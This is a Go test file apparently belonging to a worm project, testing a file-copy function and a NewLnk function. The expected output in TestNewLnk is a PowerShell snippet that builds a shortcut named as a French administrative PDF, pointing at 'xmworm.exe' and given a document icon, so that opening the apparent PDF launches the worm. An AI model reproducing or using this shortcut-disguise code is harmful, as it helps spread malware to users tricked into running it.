package files

import (
	"testing"
	"os"
	"fmt"
	"reflect"
)

func TestCopy(t *testing.T) {
	t.Run("check if can copy a file", func(t *testing.T) {

		pwd, _ := os.Getwd()
		src_pathname := fmt.Sprintf(`%s\%s`, pwd, `src.txt`)
		dst_pathname := `G:\dst.txt`
		src_stats, err := os.Stat(src_pathname)
		if err != nil {
			panic(err)
		}
		want := src_stats.Size()
		got, err := Copy(src_pathname, dst_pathname)
		if err != nil {
			panic(err)
		}
		if want != got {
			t.Errorf("got %v want %v", got, want)
		}
	})
}

func TestNewLnk(t *testing.T) {
	want := LnkFile{
		name: `Z:\Dossier Administratif Janvier 2022.pdf.lnk`,
		cmd: `
$shell = New-Object -COM WScript.Shell
$shortcut = $shell.CreateShortcut("Z:\Dossier Administratif Janvier 2022.pdf.lnk")
$shortcut.TargetPath="Z:\xmworm.exe"
$shortcut.Arguments='"Z:\Dossier Administratif Janvier 2022.pdf"'
$shortcut.IconLocation="C:\Windows\System32\SHELL32.dll,1"
$shortcut.Save()
$shortcut.Save()
`}
	got := NewLnk(`Z:\xmworm.exe`, `Z:\Dossier Administratif Janvier 2022.pdf`)

	if !reflect.DeepEqual(want, got) {
		t.Errorf("want %v, got %v", want, got)
	}
}